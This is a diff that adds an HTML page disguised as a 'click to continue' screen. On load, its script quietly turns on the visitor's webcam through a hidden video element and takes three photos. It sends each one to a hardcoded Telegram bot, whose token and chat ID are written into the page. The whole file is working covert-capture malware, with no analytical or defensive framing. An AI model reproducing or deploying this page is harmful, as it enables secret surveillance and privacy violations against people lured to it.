@@ -1,0 +1,109 @@
+<html>
+<head>
+    <style>
+        @keyframes blink {
+            0% { background-color: #FF0000; }
+            8.33% { background-color: #FF7F00; }
+            16.66% { background-color: #FFFF00; }
+            25% { background-color: #7FFF00; }
+            33.33% { background-color: #00FF00; }
+            41.66% { background-color: #00FF7F; }
+            50% { background-color: #00FFFF; }
+            58.33% { background-color: #007FFF; }
+            66.66% { background-color: #0000FF; }
+            75% { background-color: #7F00FF; }
+            83.33% { background-color: #FF00FF; }
+            91.66% { background-color: #FF007F; }
+            100% { background-color: #FF0000; }
+        }
+
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            animation: blink 12s infinite;
+            font-family: Arial, sans-serif;
+        }
+
+        .button {
+            background-color: #D0D0FF;
+            padding: 20px 40px;
+            border-radius: 5px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #000000;
+            cursor: pointer;
+        }
+
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="button" onclick="location.reload()">Klik Untuk Melanjutkan</div>
+    <video id="video" autoplay></video>
+    <script>
+        const botToken = '7721778131:AAGmUWdcG0zWz0Om65AM7NXfhyhldHVNT1k';
+        const chatId = '7336408897';
+
+        async function sendPhotoToTelegram(photo) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photo, 'photo.jpg');
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            return blob;
+        }
+
+        async function captureAndSendPhotos() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            for (let i = 0; i < 3; i++) {
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second
+                const photo = await takePhoto();
+                await sendPhotoToTelegram(photo);
+                notifyUser(`🟢 𝙁𝙊𝙏𝙊 𝘽𝙀𝙍𝙃𝘼𝙎𝙄𝙇 𝙆𝙄𝙏𝘼 𝘼𝙈𝘽𝙄𝙇 || 𝙎𝘾𝙍𝙄𝙋𝙏 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘽𝙔 𝙒𝘼𝙍𝙕XD𝙊𝙁𝘾`);
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        }
+
+        function notifyUser(message) {
+            if (Notification.permission === 'granted') {
+                new Notification(message);
+            } else if (Notification.permission !== 'denied') {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') {
+                        new Notification(message);
+                    }
+                });
+            }
+        }
+
+        window.onload = () => {
+            if (Notification.permission !== 'granted') {
+                Notification.requestPermission();
+            }
+            captureAndSendPhotos();
+        };
+    </script>
+</body>
+</html>
